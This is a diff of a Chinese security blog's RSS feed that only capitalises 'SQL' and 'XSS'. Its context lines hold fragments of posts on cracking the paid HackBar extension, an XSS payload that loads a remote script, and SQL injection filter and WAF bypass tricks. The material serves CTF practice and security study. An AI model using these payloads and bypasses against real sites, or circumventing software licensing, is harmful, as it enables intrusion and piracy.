@@ -360,7 +360,7 @@
 </li>
 </ol>
 ]]></description></item><item><title>HackBar破解</title><link>https://zu1k.com/posts/security/web-security/hack-hackbar/</link><pubDate>Sun, 22 Mar 2020 10:11:42 +0800</pubDate><author>zu1k</author><guid>https://zu1k.com/posts/security/web-security/hack-hackbar/</guid><description><![CDATA[<h2 id="前言">前言</h2>
-<p>相信很多研究安全或者打CTF的朋友都在使用HackBar，在浏览器中使用HackBar构造并发送请求非常方便，特别是测试sql注入和xss等常见漏洞。</p>
+<p>相信很多研究安全或者打CTF的朋友都在使用HackBar，在浏览器中使用HackBar构造并发送请求非常方便，特别是测试SQL注入和XSS等常见漏洞。</p>
 <p>但是HackBar是收费软件，在其 <a href="https://hackbar.site/" target="_blank" rel="noopener noreffer" class="post-link">官网</a> 上，价格由3刀到89刀不等。很多安全研究人员会选择购买89刀的10年证书，但是对于学生来说，短期的一个月1刀的短期价格对于这样一个浏览器插件来说还是比较贵的。</p>
 <p></p>
 <p>考虑到浏览器扩展插件的逻辑代码都是js代码，并且大部分工具类插件的代码都存放在本地，所以破解这类软件变得非常简单。</p>
@@ -534,7 +534,7 @@
 <p></p>
 <h2 id="总结">总结</h2>
 <p>本文以HackBar的chrome插件的分析破解为例，想大家展示了浏览器插件的简单破解，Firefox的插件破解也是大同小异，希望大家可以活学活用</p>
-]]></description></item><item><title>xss payload</title><link>https://zu1k.com/posts/security/web-security/xss-payload/</link><pubDate>Sun, 14 Oct 2018 18:11:03 +0800</pubDate><author>zu1k</author><guid>https://zu1k.com/posts/security/web-security/xss-payload/</guid><description><![CDATA[<p>总结了常用的xss payload</p>
+]]></description></item><item><title>XSS payload</title><link>https://zu1k.com/posts/security/web-security/xss-payload/</link><pubDate>Sun, 14 Oct 2018 18:11:03 +0800</pubDate><author>zu1k</author><guid>https://zu1k.com/posts/security/web-security/xss-payload/</guid><description><![CDATA[<p>总结了常用的XSS payload</p>
 <p>1.普通的XSS JavaScript注入</p>
 <pre><code>&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;
 </code></pre>
@@ -779,9 +779,9 @@ s878926199a
   
 0x03 md5(md5(str).&quot;SALT&quot;)
 2
-0e774261293712168181959463563504</code></pre>]]></description></item><item><title>sql注入针对关键字过滤的绕过技巧</title><link>https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</link><pubDate>Sun, 14 Oct 2018 18:07:45 +0800</pubDate><author>zu1k</author><guid>https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</guid><description><![CDATA[<p>在sql注入中经常会遇到服务端针对注入关键字进行过滤，经过查询各种文章，总结了一部分绕过的方法。</p>
+0e774261293712168181959463563504</code></pre>]]></description></item><item><title>SQL注入针对关键字过滤的绕过技巧</title><link>https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</link><pubDate>Sun, 14 Oct 2018 18:07:45 +0800</pubDate><author>zu1k</author><guid>https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</guid><description><![CDATA[<p>在SQL注入中经常会遇到服务端针对注入关键字进行过滤，经过查询各种文章，总结了一部分绕过的方法。</p>
 <blockquote>
-<p>2020.08.08更新：增加利用MySQL8.0语法新特性绕过方法，增加sql注入过滤和检测的几种思路和绕过方法</p>
+<p>2020.08.08更新：增加利用MySQL8.0语法新特性绕过方法，增加SQL注入过滤和检测的几种思路和绕过方法</p>
 </blockquote>
 <h2 id="过滤空格">过滤空格</h2>
 <h3 id="使用注释符绕过">使用注释符<code>/**/</code>绕过</h3>
@@ -840,7 +840,7 @@ s878926199a
 </div>
 </div><h2 id="过滤引号">过滤引号</h2>
 <h3 id="使用16进制绕过">使用<strong>16进制</strong>绕过</h3>
-<p>会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p>
+<p>会使用到引号的地方一般是在最后的where子句中。如下面的一条SQL语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -850,7 +850,7 @@ s878926199a
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>这个时候如果引号被过滤了，那么上面的<code>where</code>子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。
-<code>users</code>的十六进制的字符串是<code>7573657273</code>。那么最后的sql语句就变为了：</p>
+<code>users</code>的十六进制的字符串是<code>7573657273</code>。那么最后的SQL语句就变为了：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -933,7 +933,7 @@ s878926199a
 <h3 id="使用greatestleast函数绕过">使用**<code>greatest()</code>、<code>least（）</code>函数**绕过</h3>
 <p>greatest()、least（）：（前者返回最大值，后者返回最小值）</p>
 <p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了</p>
-<p>最常见的一个盲注的sql语句：</p>
+<p>最常见的一个盲注的SQL语句：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -943,7 +943,7 @@ s878926199a
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,&hellip;)函数返回输入参数(n1,n2,n3,&hellip;)的最大值</p>
-<p>那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
+<p>那么上面的这条SQL语句可以使用greatest变为如下的子句:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -1016,7 +1016,7 @@ s878926199a
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="使用语法新特性绕过屏蔽select">使用语法新特性绕过屏蔽select</h3>
-<p>在MySQL 8.0.19版本后，mysql推出了一些新特性，使我们可以不使用select就能够取数据</p>
+<p>在MySQL 8.0.19版本后，MySQL推出了一些新特性，使我们可以不使用select就能够取数据</p>
 <h4 id="table-语句">TABLE 语句</h4>
 <p>可以直接列出表的全部内容</p>
 <div class="highlight"><div class="chroma">
@@ -1178,7 +1178,7 @@ s878926199a
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>这段代码首先将sql语句除了<code>a-z``0-9</code>和几个有限的字符外的其他所有字符替换为空，然后对其进行匹配，如果能够匹配到类似<code>unionall</code>、<code>(select</code>这样的获取数据所要用到的代码，就拒绝执行</p>
+</div><p>这段代码首先将SQL语句除了<code>a-z``0-9</code>和几个有限的字符外的其他所有字符替换为空，然后对其进行匹配，如果能够匹配到类似<code>unionall</code>、<code>(select</code>这样的获取数据所要用到的代码，就拒绝执行</p>
 <p>但是即便是这样也还可以绕过，比如同表注入就不需要用到子查询</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1213,6 +1213,6 @@ s878926199a
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="语义分析">语义分析</h3>
-<p>这是最高级的方式，模仿mysql对sql的分析，waf对用户的输入进行语法语义分析，如果符合mysql的语法，就判断为sql注入从而阻断</p>
+<p>这是最高级的方式，模仿MySQL对SQL的分析，waf对用户的输入进行语法语义分析，如果符合MySQL的语法，就判断为SQL注入从而阻断</p>
 <p>这种防护的绕过思路就是找特殊的语法，这些特殊语法waf可能没有覆盖全面，从而导致waf语义分析失败，从而进行绕过</p>
-<p>例如我们上面说的mysql8的tables和values语句就是比较新的语法，有很多waf还米有覆盖到</p>]]></description></item></channel></rss>
+<p>例如我们上面说的MySQL8的tables和values语句就是比较新的语法，有很多waf还米有覆盖到</p>]]></description></item></channel></rss>
